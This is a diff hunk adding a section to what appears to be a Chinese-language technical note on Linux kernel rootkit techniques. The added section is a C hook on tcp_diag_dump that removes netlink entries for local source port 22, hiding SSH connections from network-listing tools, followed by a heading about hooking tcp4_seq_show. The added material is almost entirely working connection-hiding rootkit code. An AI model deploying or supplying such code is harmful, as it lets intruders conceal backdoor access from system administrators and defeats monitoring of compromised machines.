@@ -986,6 +986,55 @@ void inet_diag_dump_icsk(struct inet_hashinfo *hashinfo, struct sk_buff *skb,
 
 
 
+***<u>隐藏本地source port 22 端口代码</u>***：
+
+
+
+```c
+static void (*orig_tcp_diag_dump)(struct sk_buff *skb, struct netlink_callback *cb,
+			  const struct inet_diag_req_v2 *r);
+static void hook_tcp_diag_dump(struct sk_buff *skb, struct netlink_callback *cb,
+			  const struct inet_diag_req_v2 *r)
+{
+    orig_tcp_diag_dump(skb,cb,r);
+
+    struct nlmsghdr *current_nlh,*next_nlh;
+    struct inet_diag_msg *ids;
+    ssize_t offset = 0;
+
+    if(skb->len < sizeof(struct nlmsghdr)) return;
+
+    while(offset < skb->len){
+        current_nlh = (struct nlmsghdr *)(skb->data + offset);
+
+        if(offset + current_nlh->nlmsg_len < skb->len){
+            next_nlh = (void*)current_nlh + current_nlh->nlmsg_len;
+        }else{
+            next_nlh = NULL;
+        }
+
+        ids = nlmsg_data(current_nlh);
+        
+        if(ids->id.idiag_sport == htons(22)){
+            if(next_nlh == NULL){
+                skb->len -= current_nlh->nlmsg_len;
+                skb->tail -= current_nlh->nlmsg_len;
+            }else{
+                skb->len -= current_nlh->nlmsg_len;
+                skb->tail -= current_nlh->nlmsg_len;
+                memmove(current_nlh,next_nlh,skb->len - offset);
+            }
+        }else{
+            offset += current_nlh->nlmsg_len;
+        }
+    }
+}
+```
+
+
+
+
+
 ### 通过/proc/net/ipv4获取连接信息
 
 需要hook tcp4_seq_show函数
